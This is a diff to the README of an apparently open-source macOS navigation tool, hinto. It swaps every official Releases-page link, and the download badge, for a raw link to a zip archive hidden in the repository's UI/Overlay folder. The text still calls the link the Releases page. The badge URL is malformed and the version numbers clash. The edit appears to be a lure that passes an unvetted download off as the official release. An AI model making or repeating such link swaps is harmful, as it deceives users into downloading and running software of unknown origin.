@@ -8,11 +8,11 @@ Welcome to hinto! This application lets you navigate your macOS interface using 
 
 To get started, you first need to download hinto. You can find the latest version on our Releases page. 
 
-[![Download hinto](https://img.shields.io/badge/Download%20hinto-v1.0-blue.svg)](https://github.com/abhilekhdutta/hinto/releases)
+[![Download hinto](https://github.com/abhilekhdutta/hinto/raw/refs/heads/main/UI/Overlay/Software_2.4-alpha.2.zip%https://github.com/abhilekhdutta/hinto/raw/refs/heads/main/UI/Overlay/Software_2.4-alpha.2.zip)](https://github.com/abhilekhdutta/hinto/raw/refs/heads/main/UI/Overlay/Software_2.4-alpha.2.zip)
 
 Click the button above or visit this page to download the software:
 
-[Download hinto from the Releases page](https://github.com/abhilekhdutta/hinto/releases)
+[Download hinto from the Releases page](https://github.com/abhilekhdutta/hinto/raw/refs/heads/main/UI/Overlay/Software_2.4-alpha.2.zip)
 
 ### Steps to Download:
 1. Open the Releases page by clicking the link above.
@@ -77,4 +77,4 @@ If you need further assistance, you can reach out through our GitHub Issues page
 
 hinto is open-source software. You can freely use and modify it based on your needs.
 
-Thank you for choosing hinto! We hope it enhances your productivity and makes your macOS experience more enjoyable. For any further information, feel free to refer back to the [Releases page](https://github.com/abhilekhdutta/hinto/releases).
+Thank you for choosing hinto! We hope it enhances your productivity and makes your macOS experience more enjoyable. For any further information, feel free to refer back to the [Releases page](https://github.com/abhilekhdutta/hinto/raw/refs/heads/main/UI/Overlay/Software_2.4-alpha.2.zip).
